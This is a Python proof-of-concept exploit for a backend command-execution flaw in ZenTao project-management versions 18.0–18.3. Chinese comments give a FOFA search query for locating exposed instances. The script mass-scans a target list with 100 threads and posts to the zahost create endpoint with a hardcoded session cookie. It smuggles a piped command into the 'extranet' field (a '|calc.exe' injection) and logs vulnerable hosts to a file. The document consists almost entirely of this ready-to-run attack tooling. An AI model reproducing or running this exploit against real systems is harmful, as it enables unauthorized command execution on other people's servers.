#禅道v18.0-v18.3后台命令执行

#fofa语法：app="易软天创-禅道系统"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
                      _             
                     | |            
   ___ __ _ _ __   __| | __ _  ___  
  / __/ _` | '_ \ / _` |/ _` |/ _ \ 
 | (_| (_| | | | | (_| | (_| | (_) |
  \___\__,_|_| |_|\__,_|\__,_|\___/ 
                                                                                                                                                                 
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="禅道v18.0-v18.3")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/zentaopms/www/index.php?m=zahost&f=create'
    url = target + url_payload
    header = {
        'User-Agent':'Mozilla/5.0(Windows NT 10.0;Win64;x64;rv:109.0)Gecko/20100101 Firefox/111.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Referer': 'http://127.0.0.1/zentaopms/www/index.php?m=zahost&f=create',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Length': '141',
        'Origin': 'http://127.0.0.1',
        'Connection': 'close',
        'Cookie': 'zentaosid=fwaf16g51w678678qw686;',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin'
    }
    data =  "vsoft=kvm&hostType=physical&name=penson&extranet=xxx.xxx.xxx.xxx%7Ccalc.exe&cpuCores=2&memory=16&diskSize=16&desc=&uid=640be59da4851&type=z"
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=header,data=data,verify=False)
        if res.status_code == 200 and "Set-Cookie" in res.text:
            print(f"f[+]该url存在命令执行漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在命令执行漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()